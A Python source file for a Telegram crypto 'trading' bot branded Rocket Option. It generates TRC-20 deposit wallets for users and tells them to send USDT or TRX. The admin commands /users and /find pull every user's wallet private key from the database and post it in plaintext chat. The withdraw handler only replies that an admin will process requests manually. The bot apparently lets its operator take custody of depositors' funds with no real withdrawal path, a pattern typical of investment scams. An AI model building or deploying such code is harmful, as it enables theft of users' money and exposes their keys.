# === MERGED BOT: profit_bridge_bot.py (with admin_user_view) ===

import imghdr_patch
import telebot
import time
import logging
from datetime import datetime
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

from config import BOT_TOKEN, ADMIN_USER_ID
from wallet_manager import get_wallet_by_user, create_wallet_for_user
from balance import refresh_user_balance
from handle_mint import handle_mint
from db import get_connection
from user_store import ensure_user_profile

bot = telebot.TeleBot(BOT_TOKEN)

logging.basicConfig(level=logging.INFO)

# --- Delete webhook before polling ---
try:
    bot.delete_webhook()
    print("✅ Webhook deleted successfully")
except Exception as e:
    print(f"❌ Webhook deletion failed: {e}")

# === START Command ===
@bot.message_handler(commands=['start'])
def start(message):
    telegram_id = message.from_user.id
    full_name = f"{message.from_user.first_name} {message.from_user.last_name or ''}".strip()
    ensure_user_profile(telegram_id, full_name)

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📅 Deposit", callback_data="deposit"),
         InlineKeyboardButton("📊 Balance", callback_data="view_balance")],
        [InlineKeyboardButton("⚒️ Trade", callback_data="start_trade"),
         InlineKeyboardButton("💸 Withdraw", callback_data="withdraw_request")]
    ])

    bot.send_message(
        message.chat.id,
        "👋 *Welcome to Rocket Option!*\n\nUse the buttons below to manage your wallet and start trading using our bot.",
        parse_mode='Markdown',
        reply_markup=keyboard
    )

# === BALANCE ===
@bot.message_handler(commands=['balance'])
def balance(message):
    telegram_id = message.from_user.id
    wallet = get_wallet_by_user(telegram_id)
    if not wallet:
        bot.send_message(message.chat.id, "🚫 Wallet not found. Use the Deposit button to generate one.")
        return

    try:
        refresh_user_balance(telegram_id)
        updated = get_wallet_by_user(telegram_id)
        trx, usdt = updated.get("trx_balance", 0), updated.get("usdt_balance", 0)

        msg = (
            f"📊 *Wallet Overview*\n━━━━━━━━━━━━━━━━━━━━\n"
            f"💵 *USDT*: `{usdt:.2f}`\n💰 *TRX*: `{trx:.4f}`\n\n"
            f"🔐 Address:\n`{wallet['address']}`"
        )

        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_balance")],
            [InlineKeyboardButton("⚒️ Trade", callback_data="start_trade"),
             InlineKeyboardButton("💸 Withdraw", callback_data="withdraw_request")]
        ])

        bot.send_message(message.chat.id, msg, parse_mode='Markdown', reply_markup=keyboard)
    except Exception as e:
        logging.error(f"Balance error: {e}")
        bot.send_message(message.chat.id, "⚠️ Failed to fetch balance. Try later.")

# === TRADE ===
@bot.message_handler(commands=['trade'])
def trade(message):
    try:
        handle_mint(update=message, context=None)
    except Exception as e:
        logging.error(f"Trade error: {e}")
        bot.send_message(message.chat.id, "❌ Trade failed. Try again.")

# === WITHDRAW ===
@bot.message_handler(commands=['withdraw'])
def withdraw(message):
    bot.send_message(
        message.chat.id,
        "💸 *Withdrawal Request Received!*\nAdmin will verify and process manually.",
        parse_mode='Markdown'
    )

# === ADMIN: Panel ===
@bot.message_handler(commands=['admin'])
def show_admin_panel(message):
    if str(message.from_user.id) != ADMIN_USER_ID:
        bot.send_message(message.chat.id, "🚫 Unauthorized.")
        return

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🧾 View All Users", callback_data='view_all_users')],
        [InlineKeyboardButton("🔍 Search by ID", switch_inline_query_current_chat='/find ')],
        [InlineKeyboardButton("📊 Statistics", callback_data='view_stats')]
    ])
    bot.send_message(message.chat.id, "👮 Admin Panel:", reply_markup=keyboard)

# === ADMIN: View All Users ===
@bot.message_handler(commands=['users'])
def list_all_users(message):
    if str(message.from_user.id) != ADMIN_USER_ID:
        bot.send_message(message.chat.id, "🚫 Unauthorized.")
        return

    conn = get_connection()
    cur = conn.cursor()
    cur.execute("""
        SELECT u.telegram_id, u.wallet_address, u.private_key,
               b.trx_balance, b.usdt_balance, b.updated_at
        FROM users u
        LEFT JOIN balances b ON u.telegram_id = b.telegram_id
        ORDER BY b.updated_at DESC;
    """)
    users = cur.fetchall()

    if not users:
        bot.send_message(message.chat.id, "😔 No registered users yet.")
        return

    for user in users:
        uid = user['telegram_id']
        address = user.get('wallet_address') or 'N/A'
        key = user.get('private_key') or 'N/A'
        trx = user.get('trx_balance') or 0
        usdt = user.get('usdt_balance') or 0
        updated = user.get('updated_at')
        time_str = updated.strftime("%d-%b-%Y %I:%M %p") if updated else 'N/A'

        msg = (
            f"👤 User ID: `{uid}`\n"
            f"🕒 Last Update: *{time_str}*\n\n"
            f"🔐 Address: `{address}`\n"
            f"🔑 Key: `{key}`\n"
            f"💰 TRX: {trx:.4f}\n💵 USDT: {usdt:.2f}"
        )
        bot.send_message(message.chat.id, msg, parse_mode='Markdown')

    cur.close()
    conn.close()

# === ADMIN: Search ===
@bot.message_handler(commands=['find'])
def find_user(message):
    if str(message.from_user.id) != ADMIN_USER_ID:
        bot.send_message(message.chat.id, "🚫 Unauthorized.")
        return

    parts = message.text.strip().split()
    if len(parts) != 2:
        bot.send_message(message.chat.id, "❗ Usage: /find <telegram_id>")
        return

    try:
        search_id = int(parts[1])
    except ValueError:
        bot.send_message(message.chat.id, "❗ Invalid telegram ID.")
        return

    conn = get_connection()
    cur = conn.cursor()
    cur.execute("""
        SELECT u.telegram_id, u.wallet_address, u.private_key,
               b.trx_balance, b.usdt_balance, b.updated_at
        FROM users u
        LEFT JOIN balances b ON u.telegram_id = b.telegram_id
        WHERE u.telegram_id = %s;
    """, (search_id,))
    user = cur.fetchone()
    cur.close()
    conn.close()

    if not user:
        bot.send_message(message.chat.id, "🚫 User not found.")
        return

    uid = user['telegram_id']
    address = user.get('wallet_address') or 'N/A'
    key = user.get('private_key') or 'N/A'
    trx = user.get('trx_balance') or 0
    usdt = user.get('usdt_balance') or 0
    updated = user.get('updated_at')
    time_str = updated.strftime("%d-%b-%Y %I:%M %p") if updated else 'N/A'

    msg = (
        f"🔍 Result for `{uid}`:\n"
        f"🕒 Last Update: *{time_str}*\n\n"
        f"🔐 Address: `{address}`\n"
        f"🔑 Key: `{key}`\n"
        f"💰 TRX: {trx:.4f}\n💵 USDT: {usdt:.2f}"
    )
    bot.send_message(message.chat.id, msg, parse_mode='Markdown')

# === Callback Handler (Unified for Admin & Users) ===
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = str(call.from_user.id)

    if user_id == ADMIN_USER_ID:
        if call.data == 'view_all_users':
            list_all_users(call.message)
        elif call.data == 'view_stats':
            bot.send_message(call.message.chat.id, "📊 Stats feature coming soon.")
        else:
            bot.answer_callback_query(call.id, "✅ Admin action.")
        return

    # --- Regular user buttons ---
    if call.data == "refresh_balance":
        balance(call.message)
    elif call.data == "start_trade":
        trade(call.message)
    elif call.data == "view_balance":
        balance(call.message)
    elif call.data == "withdraw_request":
        withdraw(call.message)
    elif call.data == "deposit":
        telegram_id = call.from_user.id
        wallet = get_wallet_by_user(telegram_id) or create_wallet_for_user(telegram_id)

        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Check Balance", callback_data="view_balance"),
             InlineKeyboardButton("⚒️ Start Trade", callback_data="start_trade")]
        ])

        bot.send_message(
            call.message.chat.id,
            f"📅 *Deposit Wallet (TRC-20)*\n━━━━━━━━━━━━━━━━━━━━\n🔐 Address:\n`{wallet['address']}`\n\n💡 Send *USDT (TRC-20)* or *TRX* to this address.",
            parse_mode='Markdown',
            reply_markup=keyboard
        )

# === Polling Loop ===
print("🤖 Profit_Bridge Bot is running... Press Ctrl+C to stop.")
while True:
    try:
        bot.polling(none_stop=True, interval=2, timeout=30)
    except Exception as e:
        print(f"❌ Bot crashed: {e}")
        print("🔄 Restarting in 15 seconds...")
        time.sleep(15)
        try:
            bot.delete_webhook()
            print("✅ Webhook cleared before restart")
        except Exception as err:
            print(f"⚠️ Webhook reset failed: {err}")
